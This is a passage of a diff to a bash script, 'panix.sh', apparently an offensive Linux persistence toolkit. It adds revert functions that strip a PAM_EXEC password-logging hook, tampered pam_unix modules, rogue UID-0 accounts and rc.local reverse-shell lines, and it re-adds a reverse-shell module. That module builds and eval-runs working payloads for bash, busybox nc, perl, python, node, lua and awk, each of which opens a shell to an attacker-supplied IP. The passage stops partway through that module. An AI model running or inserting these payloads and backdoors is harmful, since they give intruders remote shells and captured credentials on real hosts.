+			if [[ $? -eq 0 ]]; then
+				echo "[+] Removed '/var/log/panix.log'."
+			else
+				echo "[-] Failed to remove '/var/log/panix.log'."
+			fi
+		else
+			echo "[-] '/var/log/panix.log' not found."
+		fi
+
+		# Remove the PAM_EXEC line from /etc/pam.d/common-auth
+		pam_common_auth_file="/etc/pam.d/common-auth"
+		pam_sshd_file_rhel="/etc/pam.d/sshd"
+		pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'
+		if grep -Fxq "$pam_line" "$pam_common_auth_file"; then
+			sed -i "\|$pam_line|d" "$pam_common_auth_file"
+			echo "[+] Removed PAM_EXEC line from '$pam_common_auth_file'."
+		elif grep -Fxq "$pam_line" "$pam_sshd_file_rhel"; then
+			sed -i "\|$pam_line|d" "$pam_sshd_file_rhel"
+			echo "[+] Removed PAM_EXEC line from '$pam_sshd_file_rhel'."
+		else
+			echo "[-] PAM_EXEC line not found in '$pam_common_auth_file'."
+		fi
+	}
+
+	# Check for the presence of the malicious PAM module
+	is_pam_module_replaced=false
+	pam_module_paths=(
+		"/lib/security/pam_unix.so"
+		"/usr/lib64/security/pam_unix.so"
+		"/lib/x86_64-linux-gnu/security/pam_unix.so"
+		"/lib64/security/pam_unix.so"
+	)
+	for pam_module in "${pam_module_paths[@]}"; do
+		if [[ -f "$pam_module" ]]; then
+			# Check if the pam_unix.so has been modified
+			if strings "$pam_module" | grep -q "PANIX"; then
+				is_pam_module_replaced=true
+				break
+			fi
+		fi
+	done
+
+	if [[ "$is_pam_module_replaced" = true ]]; then
+		echo "[+] Malicious PAM module detected."
+		restore_pam_module
+	else
+		echo "[-] No malicious PAM module detected."
+	fi
+
+	# Remove PAM_EXEC backdoor and logging
+	remove_pam_exec_backdoor
+	remove_pam_exec_logging
+
+	# Restore SELinux enforcing mode if it was disabled
+	if command -v sestatus &>/dev/null && sestatus | grep -q "disabled"; then
+		echo "[+] Restoring SELinux enforcing mode..."
+		setenforce 1
+		echo "[+] SELinux enforcing mode restored."
+	fi
+
+	return 0
+}
+
 # Module: setup_passwd_user.sh
 setup_passwd_user() {
 	local default=0
@@ -2696,6 +3955,7 @@ setup_passwd_user() {
 		echo "  --password <password>        Specify the password"
 		echo "--custom                     Use custom string"
 		echo "  --passwd-string <string>     Specify the /etc/passwd string"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2784,6 +4044,125 @@ setup_passwd_user() {
 	echo "[+] /etc/passwd persistence established!"
 }
 
+# Revert Module: revert_passwd_user.sh
+revert_passwd_user() {
+	usage_revert_passwd_user() {
+		echo "Usage: ./panix.sh --revert passwd-user"
+		echo "Reverts any changes made by the setup_passwd_user module."
+	}
+
+	# Ensure the function is run as root
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to backup /etc/passwd before making changes
+	backup_passwd() {
+		if [[ ! -f /etc/passwd.backup ]]; then
+			cp /etc/passwd /etc/passwd.backup
+			echo "[+] Backup of /etc/passwd created at /etc/passwd.backup."
+		else
+			echo "[!] Backup of /etc/passwd already exists at /etc/passwd.backup."
+		fi
+	}
+
+	# Function to remove a user entry from /etc/passwd
+	remove_user_entry() {
+		local user="$1"
+		if grep -q "^${user}:" /etc/passwd; then
+			sed -i "\|^${user}:|d" /etc/passwd
+			echo "[+] Removed user '$user' from /etc/passwd."
+		else
+			echo "[-] User '$user' not found in /etc/passwd."
+		fi
+	}
+
+	# Function to check if a user is a legitimate system user
+	is_system_user() {
+		local user="$1"
+		local system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
+		for sys_user in "${system_users[@]}"; do
+			if [[ "$user" == "$sys_user" ]]; then
+				return 0
+			fi
+		done
+		return 1
+	}
+
+	# Backup /etc/passwd
+	backup_passwd
+
+	# Define system users for pattern matching
+	system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
+
+	# Create a regex pattern for system users, set IFS locally
+	system_users_pattern=$(IFS='|'; printf "%s|" "${system_users[@]}")
+	system_users_pattern=${system_users_pattern%|}  # Remove trailing '|'
+
+	# Properly escape regex special characters
+	system_users_pattern=$(echo "$system_users_pattern" | sed 's/[.^$*+?()[\]{}|\/]/\\&/g')
+
+	# Remove default setup entries: users with UID=0 and shell=/bin/bash, excluding system users
+	echo "[+] Removing default setup user entries..."
+	malicious_users=$(awk -F: '($3 == "0") && ($7 == "/bin/bash") {print $1}' /etc/passwd)
+
+	if [[ -n "$malicious_users" ]]; then
+		for user in $malicious_users; do
+			if ! is_system_user "$user"; then
+				echo "[+] Identified malicious user: '$user'"
+				remove_user_entry "$user"
+
+				# Optionally, remove the user account from the system
+				if id "$user" &>/dev/null; then
+					userdel -r "$user" && echo "[+] User account '$user' deleted from the system."
+				else
+					echo "[-] User account '$user' does not exist on the system."
+				fi
+			else
+				echo "[-] Legitimate system user '$user' found. Skipping."
+			fi
+		done
+	else
+		echo "[-] No default setup user entries found to remove."
+	fi
+
+	# Remove custom setup entries by searching for suspicious entries
+	echo "[+] Searching for custom setup passwd entries..."
+
+	# Example pattern: usernames that are not in the system users list and have UID >= 65536
+	all_users=$(awk -F: '{print $1}' /etc/passwd)
+
+	# Iterate through all users
+	for user in $all_users; do
+		if [[ "$user" =~ ^($system_users_pattern)$ ]]; then
+			continue  # Skip legitimate system users
+		fi
+
+		# Check if the user has UID >= 65536 and shell=/bin/bash
+		user_info=$(grep "^$user:" /etc/passwd)
+		uid=$(echo "$user_info" | awk -F: '{print $3}')
+		shell=$(echo "$user_info" | awk -F: '{print $7}')
+
+		if [[ "$uid" -ge 65536 && "$shell" == "/bin/bash" ]]; then
+			echo "[+] Identified suspicious user: '$user'"
+			remove_user_entry "$user"
+
+			# Optionally, remove the user account from the system
+			if id "$user" &>/dev/null; then
+				userdel -r "$user" && echo "[+] User account '$user' deleted from the system."
+			else
+				echo "[-] User account '$user' does not exist on the system."
+			fi
+		fi
+	done
+
+	echo "[!] If any legitimate users were removed unintentionally, restore from the backup."
+	echo "[!] Run 'sudo cp /etc/passwd.backup /etc/passwd' to restore the original /etc/passwd file if necessary."
+
+	return 0
+}
+
 # Module: setup_password_change.sh
 setup_password_change() {
 	local username=""
@@ -2799,6 +4178,7 @@ setup_password_change() {
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 		echo "--password <password>      Specify the new password"
+		echo "--help|-h                  Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2844,6 +4224,17 @@ setup_password_change() {
 	fi
 }
 
+# Revert Module: revert_password_change.sh
+revert_password_change() {
+
+    echo "[!] Function setup_password_change does not have a revert function."
+    return 1
+
+	usage_revert_password_change() {
+		echo "Usage: ./panix.sh --revert password-change"
+		echo "Reverts any changes made by the setup_password_change module."
+	}
+}
 # Module: setup_rc_local_backdoor.sh
 setup_rc_local_backdoor() {
 	local default=0
@@ -2866,6 +4257,7 @@ setup_rc_local_backdoor() {
 		echo "  --port <port>                Specify port number"
 		echo "--custom                     Use custom rc.local settings"
 		echo "  --command <command>          Specify custom command"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -2957,319 +4349,522 @@ setup_rc_local_backdoor() {
 	echo "[+] rc.local backdoor persistence established!"
 }
 
-# Module: setup_reverse_shell.sh
-setup_reverse_shell() {
-    local ip=""
-    local port=""
-    local mechanism=""
-
-    usage_reverse_shell() {
-        echo "Usage: ./panix.sh --reverse-shell [OPTIONS]"
-        echo "--ip <ip>                       Specify the attacker's IP address"
-        echo "--port <port>                   Specify the port to connect to"
-        echo "--mechanism <mechanism>         Specify the reverse shell mechanism"
-        echo "--examples                      Display command examples"
-        echo ""
-        echo "Available mechanisms:"
-        echo "awk, bash, busybox, gawk, ksh, lua, nawk, nc, node, openssl, perl, php, pip, python, python3, ruby, sh-udp, socat, telnet"
-        echo ""
+# Revert Module: revert_rc_local_backdoor.sh
+revert_rc_local() {
+    usage_revert_rc_local() {
+        echo "Usage: ./panix.sh --revert rc-local"
+        echo "Reverts any changes made by the setup_rc_local_backdoor module."
     }
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --ip )
-                shift
-                ip=$1
-                ;;
-            --port )
-                shift
-                port=$1
-                ;;
-            --mechanism )
-                shift
-                mechanism=$1
-                ;;
-            --examples )
-                echo "Examples:"
-                echo "sudo ./panix.sh --reverse-shell --ip 10.10.10.10 --port 1337 --mechanism sh-udp"
-                exit 0
-                ;;
-            --help|-h)
-                usage_reverse_shell
-                exit 0
-                ;;
-            * )
-                echo "Invalid option for --reverse-shell: $1"
-                echo "Try './panix.sh --reverse-shell --help' for more information."
-                exit 1
-        esac
-        shift
-    done
-
-    # Validate arguments
-    if [[ -z $ip || -z $port || -z $mechanism ]]; then
-        echo "Error: --ip, --port, and --mechanism are required."
-        echo "Try './panix.sh --reverse-shell --help' for more information."
-        exit 1
+    # Ensure the function is run as root
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        return 1
     fi
 
-    case $mechanism in
-    awk )
-        # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
-        echo "[!] Checking for Awk..."
-        if command -v awk &>/dev/null; then
-            echo "[+] Awk is available. Checking compatibility with |& operator..."
-            # Test if `awk` supports the |& operator
-            if awk 'BEGIN {exit !("|&" in _ENV)}' 2>/dev/null; then
-                payload="awk -v RHOST=$ip -v RPORT=$port 'BEGIN {
-                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
-                    while (1) {
-                        printf \"> \" |& s;
-                        if ((s |& getline c) <= 0) break;
-                        while (c && (c |& getline) > 0) print \$0 |& s;
-                        close(c);
-                    }
-                }'"
-                echo "[+] Awk is compatible. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] The installed Awk does not support the |& operator. Cannot use Awk for reverse shell."
-            fi
+    # Function to backup /etc/rc.local before making changes
+    backup_rc_local() {
+        if [[ ! -f /etc/rc.local.backup ]]; then
+            cp /etc/rc.local /etc/rc.local.backup
+            echo "[+] Backup of /etc/rc.local created at /etc/rc.local.backup."
         else
-            echo "[-] Awk is not available on this system. Cannot use Awk for reverse shell."
+            echo "[+] Backup of /etc/rc.local already exists at /etc/rc.local.backup."
         fi
-        ;;
-        bash )
-            # Ref: https://gtfobins.github.io/gtfobins/bash/#reverse-shell
-            echo "[!] Checking for Bash..."
-            if command -v bash &>/dev/null; then
-                payload="setsid nohup /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
-                echo "[+] Bash is available. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] Bash is not available on this system. Cannot use Bash for reverse shell."
-            fi
-            ;;
-        busybox )
-            # Ref: https://gtfobins.github.io/gtfobins/busybox/#reverse-shell
-            echo "[!] Checking for Busybox..."
-            if command -v busybox &>/dev/null; then
-                payload="busybox nc $ip $port -e /bin/sh"
-                echo "[+] Busybox is available. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] Busybox is not available on this system. Cannot use Busybox for reverse shell."
-            fi
-            ;;
-        gawk )
-            # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
-            echo "[!] Checking for Gawk..."
-            if command -v gawk &>/dev/null; then
-                payload="gawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
-                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
-                    while (1) {
-                        printf \"> \" |& s;
-                        if ((s |& getline c) <= 0) break;
-                        while (c && (c |& getline) > 0) print \$0 |& s;
-                        close(c);
-                    }
-                }'"
-                echo "[+] Gawk is available. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] Gawk is not available on this system. Cannot use Gawk for reverse shell."
-            fi
-            ;;
-        ksh )
-            # Ref: https://gtfobins.github.io/gtfobins/ksh/#reverse-shell
-            echo "[!] Checking for Ksh..."
-            if command -v ksh &>/dev/null; then
-                payload="ksh -c 'ksh -i > /dev/tcp/$ip/$port 2>&1 0>&1'"
-                echo "[+] KornShell (KSH) is available. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] KornShell (KSH) is not available on this system. Cannot use KSH for reverse shell."
-            fi
-            ;;
-        lua )
-            # Ref: https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell
-            echo "[!] Checking for Lua..."
-            if command -v lua &>/dev/null; then
-                echo "[+] Lua is installed. Checking for LuaSocket..."
-                
-                if lua -e 'require("socket")' &>/dev/null; then
-                    payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
-                    echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
-                    eval "$payload &"
-                else
-                    echo "[-] LuaSocket module is not installed. Cannot use Lua for reverse shell."
-                fi
-            else
-                echo "[-] Lua is not available on this system. Cannot use Lua for reverse shell."
-            fi
-            ;;
-        nawk )
-            # Ref: https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell
-            echo "[!] Checking for Nawk..."
-            if command -v nawk &>/dev/null; then
-                payload="nawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
-                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
-                    while (1) {
-                        printf \"> \" |& s;
-                        if ((s |& getline c) <= 0) break;
-                        while (c && (c |& getline) > 0) print \$0 |& s;
-                        close(c);
-                    }
-                }'"
-                echo "[+] Nawk is available. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] nawk is not available on this system. Cannot use Nawk for reverse shell."
-            fi
-            ;;
-        nc )
-            # Ref: https://gtfobins.github.io/gtfobins/nc/#reverse-shell
-            echo "[!] Checking for Netcat (nc.traditional)..."
-            if command -v nc.traditional &>/dev/null; then
-                payload="nc.traditional -e /bin/sh $ip $port"
-                echo "[+] nc.traditional is available. Executing reverse shell on $ip:$port..."
-                eval "$payload &"
-            else
-                echo "[-] nc.traditional is not available on this system. Cannot use nc.traditional for reverse shell."
-            fi
-            ;;
-        node )
-            # Ref: https://gtfobins.github.io/gtfobins/node/#reverse-shell
-            echo "[!] Checking for Node.js..."
-            if command -v node &>/dev/null; then
-                echo "[+] Node.js is available. Executing reverse shell on $ip:$port..."
-                payload="export RHOST=$ip; export RPORT=$port; node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
-                eval "$payload &"
-            else
-                echo "[-] Node.js is not available on this system. Cannot use Node.js for reverse shell."
-            fi
-            ;;
-        openssl )
-            # Ref: https://gtfobins.github.io/gtfobins/openssl/#reverse-shell
-            echo "[!] Checking for OpenSSL..."
-            if command -v openssl &>/dev/null; then
-                echo "[+] OpenSSL is available. Executing reverse shell on $ip:$port..."
+    }
 
-                echo ""
-                echo "Make sure you have a correct listener up and running on the target host"
-                echo "Use the following commands to set it up if you haven't already:"
-                echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
-                echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
-                echo ""
+    # Function to escape special characters in sed patterns
+    escape_sed_pattern() {
+        local pattern="$1"
+        # Escape |, \, /, and & characters
+        printf '%s' "$pattern" | sed 's/[|\\/&]/\\&/g'
+    }
 
-                payload="RHOST=$ip; RPORT=$port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s; rm /tmp/s"
-                eval "$payload &"
-            else
-                echo "[-] OpenSSL is not available on this system. Cannot use OpenSSL for reverse shell."
-            fi
-            ;;
-        perl )
-            # Ref: https://gtfobins.github.io/gtfobins/perl/#reverse-shell
-            echo "[!] Checking for Perl..."
-            if command -v perl &>/dev/null; then
-                echo "[+] Perl is available. Executing reverse shell on $ip:$port..."
-                payload="export RHOST=$ip; export RPORT=$port; setsid nohup perl -e 'use Socket;\$i=\"\$ENV{RHOST}\";\$p=\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-                eval "$payload &"
-            else
-                echo "[-] Perl is not available on this system. Cannot use Perl for reverse shell."
-            fi
-            ;;
-        php )
-            # Ref: https://gtfobins.github.io/gtfobins/php/#reverse-shell
-            echo "[!] Checking for PHP..."
-            if command -v php &>/dev/null; then
-                echo "[+] PHP is available. Executing reverse shell on $ip:$port..."
-                payload="export RHOST=$ip; export RPORT=$port; setsid nohup php -r '\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-                eval "$payload &"
-            else
-                echo "[-] PHP is not available on this system. Cannot use PHP for reverse shell."
-                payload=""
-            fi
-            ;;
-        python )
-            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
-            echo "[!] Checking for Python..."
-            if command -v python &>/dev/null; then
-                echo "[+] Python is available. Executing reverse shell on $ip:$port..."
-                payload="nohup setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-                eval "$payload &"
-            else
-                echo "[-] Python is not available on this system. Cannot use Python for reverse shell."
-            fi
-            ;;
-        python3 )
-            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
-            echo "[!] Checking for Python3..."
-            if command -v python3 &>/dev/null; then
-                echo "[+] Python3 is available. Executing reverse shell on $ip:$port..."
-                payload="nohup setsid python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
-                eval "$payload &"
-            else
-                echo "[-] Python3 is not available on this system. Cannot use Python3 for reverse shell."
-            fi
-            ;;
-        ruby )
-            # Ref: https://gtfobins.github.io/gtfobins/ruby/#reverse-shell
-            echo "[!] Checking for Ruby..."
-            if command -v ruby &>/dev/null; then
-                echo "[+] Ruby is available. Executing reverse shell on $ip:$port..."
-                payload="export RHOST=$ip; export RPORT=$port; nohup setsid ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
-                eval "$payload &"
-            else
-                echo "[-] Ruby is not available on this system. Cannot use Ruby for reverse shell."
-            fi
-            ;;
-        sh-udp )
-            # Ref: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
-            echo "[!] Checking for Sh..."
-            if command -v sh &>/dev/null; then
-                echo "[+] Sh found. Executing reverse shell on $ip:$port..."
-                payload="setsid nohup sh -i >& /dev/udp/$ip/$port 0>&1"
-                eval "$payload &"
-            else
-                echo "[-] Sh is not available on this system. Cannot use Sh for reverse shell."
-            fi
-            ;;
-        socat )
-            # Ref: https://gtfobins.github.io/gtfobins/socat/#reverse-shell
-            echo "[!] Checking for Socat..."
-            if command -v socat &>/dev/null; then
-                echo "[+] Socat is available. Executing reverse shell to $ip:$port..."
+    # Function to remove lines matching a pattern from a file
+    remove_lines_matching_pattern() {
+        local pattern="$1"
+        local file="$2"
 
-                echo ""
-                echo "Make sure you have a correct listener up and running on the target host"
-                echo "Use the following commands to set it up if you haven't already:"
-                echo "socat FILE:`tty`,raw,echo=0 TCP:$ip:$port"
-                echo ""
+        # Escape special characters in the pattern
+        local escaped_pattern
+        escaped_pattern=$(escape_sed_pattern "$pattern")
 
-                payload="RHOST=$ip; RPORT=$port; socat tcp-connect:\$RHOST:\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
-                eval "$payload &"
-            else
-                echo "[-] Socat is not available on this system. Cannot use Socat for reverse shell."
-            fi
-            ;;
-        telnet )
-            # Ref: https://gtfobins.github.io/gtfobins/telnet/#reverse-shell
-            echo "[!] Checking for Telnet..."
-            if command -v telnet &>/dev/null; then
-                echo "[+] Telnet is available. Executing reverse shell to $ip:$port..."
-                payload="RHOST=$ip; RPORT=$port; TF=\$(mktemp -u); mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF | /bin/sh 1>\$TF"
-                eval "$payload &"
-            else
-                echo "[-] Telnet is not available on this system. Cannot use Telnet for reverse shell."
-            fi
-            ;;
-        *)
-            echo "Error: Unsupported mechanism: $mechanism"
-            echo "Try './panix.sh --reverse-shell --help' for more information."
-            exit 1
-            ;;
-    esac
+        if grep -Fq "$pattern" "$file"; then
+            sed -i "\|$escaped_pattern|d" "$file"
+            echo "[+] Removed lines matching pattern: '$pattern' from $file"
+        fi
+    }
+
+    # Backup /etc/rc.local
+    backup_rc_local
+
+    # Define malicious patterns to search for in /etc/rc.local
+    local patterns=(
+        "/bin/bash -c 'sh -i >& /dev/tcp/"
+        "setsid nohup bash -c 'sh -i >& /dev/tcp/"
+        "nohup setsid bash -c 'sh -i >& /dev/tcp/"
+        "bash -i >& /dev/tcp/"
+        "bash -c 'sh -i >& /dev/tcp/"
+        "bash -i > /dev/tcp/"
+        "sh -i >& /dev/udp/"
+        "bash -c 'bash -i >& /dev/tcp/"
+        "bash -c 'sh -i >& /dev/udp/"
+        "nohup setsid bash -c 'sh -i >& /dev/tcp/"
+        "nohup setsid sh -c 'sh -i >& /dev/tcp/"
+    )
+
+    # Remove malicious lines from /etc/rc.local
+	if [[ -f /etc/rc.local ]]; then
+		echo "[+] Scanning /etc/rc.local for malicious backdoor commands..."
+		for pattern in "${patterns[@]}"; do
+			remove_lines_matching_pattern "$pattern" "/etc/rc.local"
+		done
+	fi
+
+    # Check if /etc/rc.local contains only the shebang and is otherwise empty
+    if [[ -f /etc/rc.local ]]; then
+        # Count non-shebang and non-empty lines
+        non_shebang_lines=$(grep -v "^#!" /etc/rc.local | grep -cv "^[[:space:]]*$")
+        if [[ "$non_shebang_lines" -eq 0 ]]; then
+            echo "[+] /etc/rc.local contains only the shebang or is empty. Removing the file."
+            rm -f /etc/rc.local
+            echo "[+] Removed /etc/rc.local"
+        else
+            echo "[+] Remaining content in /etc/rc.local after removing backdoor entries."
+        fi
+    else
+        echo "[-] /etc/rc.local does not exist. No action taken."
+    fi
+
+    # Ensure /etc/rc.local has the correct permissions if it still exists
+    if [[ -f /etc/rc.local ]]; then
+        chmod +x /etc/rc.local
+        echo "[+] Set execute permissions on /etc/rc.local"
+    fi
+
+    # Ensure /etc/rc.d/rc.local is executable if it exists
+    if [[ -f /etc/rc.d/rc.local ]]; then
+        chmod +x /etc/rc.d/rc.local
+        echo "[+] Set execute permissions on /etc/rc.d/rc.local"
+    fi
+
+    echo "[!] If any legitimate entries were removed unintentionally, restore from the backup."
+    echo "[!] Run 'sudo cp /etc/rc.local.backup /etc/rc.local' to restore the original /etc/rc.local file if necessary."
+
+    return 0
+}
+
+# Module: setup_reverse_shell.sh
+setup_reverse_shell() {
+	local ip=""
+	local port=""
+	local mechanism=""
+
+	usage_reverse_shell() {
+		echo "Usage: ./panix.sh --reverse-shell [OPTIONS]"
+		echo "--ip <ip>                       Specify the attacker's IP address"
+		echo "--port <port>                   Specify the port to connect to"
+		echo "--mechanism <mechanism>         Specify the reverse shell mechanism"
+		echo "--examples                      Display command examples"
+		echo "--help|-h                       Show this help message"
+		echo ""
+		echo "Available mechanisms:"
+		echo "awk, bash, busybox, gawk, ksh, lua, nawk, nc, node, openssl, perl, php, pip, python, python3, ruby, sh-udp, socat, telnet"
+		echo ""
+	}
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			--mechanism )
+				shift
+				mechanism=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "sudo ./panix.sh --reverse-shell --ip 10.10.10.10 --port 1337 --mechanism sh-udp"
+				exit 0
+				;;
+			--help|-h)
+				usage_reverse_shell
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --reverse-shell: $1"
+				echo "Try './panix.sh --reverse-shell --help' for more information."
+				exit 1
+		esac
+		shift
+	done
+
+	# Validate arguments
+	if [[ -z $ip || -z $port || -z $mechanism ]]; then
+		echo "Error: --ip, --port, and --mechanism are required."
+		echo "Try './panix.sh --reverse-shell --help' for more information."
+		exit 1
+	fi
+
+	case $mechanism in
+	awk )
+		# Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
+		echo "[!] Checking for Awk..."
+		if command -v awk &>/dev/null; then
+			echo "[+] Awk is available. Checking compatibility with |& operator..."
+			# Test if `awk` supports the |& operator
+			if awk 'BEGIN {exit !("|&" in _ENV)}' 2>/dev/null; then
+				payload="awk -v RHOST=$ip -v RPORT=$port 'BEGIN {
+					s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
+					while (1) {
+						printf \"> \" |& s;
+						if ((s |& getline c) <= 0) break;
+						while (c && (c |& getline) > 0) print \$0 |& s;
+						close(c);
+					}
+				}'"
+				echo "[+] Awk is compatible. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
+				echo "[-] The installed Awk does not support the |& operator. Cannot use Awk for reverse shell."
+			fi
+		else
+			echo "[-] Awk is not available on this system. Cannot use Awk for reverse shell."
+		fi
+		;;
+		bash )
+			# Ref: https://gtfobins.github.io/gtfobins/bash/#reverse-shell
+			echo "[!] Checking for Bash..."
+			if command -v bash &>/dev/null; then
+				payload="setsid nohup /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
+				echo "[+] Bash is available. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
+				echo "[-] Bash is not available on this system. Cannot use Bash for reverse shell."
+			fi
+			;;
+		busybox )
+			# Ref: https://gtfobins.github.io/gtfobins/busybox/#reverse-shell
+			echo "[!] Checking for Busybox..."
+			if command -v busybox &>/dev/null; then
+				payload="busybox nc $ip $port -e /bin/sh"
+				echo "[+] Busybox is available. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
+				echo "[-] Busybox is not available on this system. Cannot use Busybox for reverse shell."
+			fi
+			;;
+		gawk )
+			# Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
+			echo "[!] Checking for Gawk..."
+			if command -v gawk &>/dev/null; then
+				payload="gawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
+					s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
+					while (1) {
+						printf \"> \" |& s;
+						if ((s |& getline c) <= 0) break;
+						while (c && (c |& getline) > 0) print \$0 |& s;
+						close(c);
+					}
+				}'"
+				echo "[+] Gawk is available. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
+				echo "[-] Gawk is not available on this system. Cannot use Gawk for reverse shell."
+			fi
+			;;
+		ksh )
+			# Ref: https://gtfobins.github.io/gtfobins/ksh/#reverse-shell
+			echo "[!] Checking for Ksh..."
+			if command -v ksh &>/dev/null; then
+				payload="ksh -c 'ksh -i > /dev/tcp/$ip/$port 2>&1 0>&1'"
+				echo "[+] KornShell (KSH) is available. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
+				echo "[-] KornShell (KSH) is not available on this system. Cannot use KSH for reverse shell."
+			fi
+			;;
+		lua )
+			# Ref: https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell
+			echo "[!] Checking for Lua..."
+			if command -v lua &>/dev/null; then
+				echo "[+] Lua is installed. Checking for LuaSocket..."
+				
+				if lua -e 'require("socket")' &>/dev/null; then
+					payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
+					echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
+					eval "$payload &"
+				else
+					echo "[-] LuaSocket module is not installed. Cannot use Lua for reverse shell."
+				fi
+			else
+				echo "[-] Lua is not available on this system. Cannot use Lua for reverse shell."
+			fi
+			;;
+		nawk )
+			# Ref: https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell
+			echo "[!] Checking for Nawk..."
+			if command -v nawk &>/dev/null; then
+				payload="nawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
+					s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
+					while (1) {
+						printf \"> \" |& s;
+						if ((s |& getline c) <= 0) break;
+						while (c && (c |& getline) > 0) print \$0 |& s;
+						close(c);
+					}
+				}'"
+				echo "[+] Nawk is available. Executing reverse shell on $ip:$port..."
+				eval "$payload &"
+			else
